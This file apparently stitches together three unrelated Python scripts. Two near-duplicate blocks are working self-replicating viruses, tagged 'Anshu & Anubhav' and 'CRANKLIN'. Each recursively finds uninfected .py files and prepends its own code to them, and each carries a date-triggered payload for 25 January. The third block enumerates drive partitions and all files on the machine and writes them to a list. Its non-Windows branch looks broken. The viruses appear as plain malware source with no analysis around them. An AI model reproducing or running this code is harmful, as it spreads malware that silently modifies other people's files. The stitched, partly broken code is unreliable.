
import os
import datetime
SIGNATURE = "Anshu & Anubhav PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print ("Anshu & Anubhav PC protector")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()

import os
import datetime
SIGNATURE = "CRANKLIN PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print ("HAPPY BIRTHDAY CRANKLIN!")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()

import glob
import time
import sys, os

os_name = sys.platform
partitionen = []
verzeichnisse = []
files = []

def partitions(sfsFolder):
    global partitionen
    big = 65

    if "win" in os_name:
        for i in range(26):
            try:
                if glob.glob(str(chr(big + i)) + ":\\"):
                    #print("Successfully found partition: " + str(chr(big + i)))
                    partitionen.append(str(chr(big + i)) + ":\\")
            except:
                continue
        return indeces(sfsFolder)
    if "win" not in os_name:
        return indeces(sfsFolder)
    
def indeces(sfsFolder):
    global verzeichnisse
    global files
    
    if "win" in os_name:
        verzeichnisse2 = glob.glob("\\*")
    else:
        verzeichnisse2 = glob.glob("//*")
    verzeichnisse_tmp = []
    x = 1

    if "win" in os_name:
        for ind in range(len(partitionen)):
            #print(partitionen[ind])
            while verzeichnisse2 != []:
                verzeichnisse2 = glob.glob(partitionen[ind] + "\\*"*x)
                for i in range(len(verzeichnisse2)):
                    verzeichnisse.append(verzeichnisse2[i])
                x += 1
            x = 1

        for i in range(len(verzeichnisse)):
            if "." in verzeichnisse[i]:
                files.append(verzeichnisse[i])
        for i in range(len(verzeichnisse)):
            if not os.path.isfile(verzeichnisse[i]):
                verzeichnisse_tmp.append(verzeichnisse[i])
        verzeichnisse = verzeichnisse_tmp
        i = 0
        f = open(sfsFolder, "w")
        for i in range(len(files)):
            f.write(files[i] + "\n")
        f.close()
        time.sleep(3)

    if "win" not in os_name:
        while verzeichnisse2 != []:
            verzeichnisse = glob.glob("//*" * x)
            for i in range(len(verzeichnisse2)):
                verzeichnisse.append(verzeichnisse2[i])
            x += 1
        x = 1

        for i in range(len(verzeichnisse)):
            if "." in verzeichnisse[i]:
                files.append(verzeichnisse[i])
        for i in range(len(verzeichnisse)):
            if not os.path.isfile(verzeichnisse[i]):
                verzeichnisse_tmp.append(verzeichnisse[i])
        verzeichnisse = verzeichnisse_tmp
        i = 0
        f = open(sfsFolder, "w")
        for i in range(len(files)):
            f.write(files[i] + "\n")
        f.close()
        time.sleep(3)

    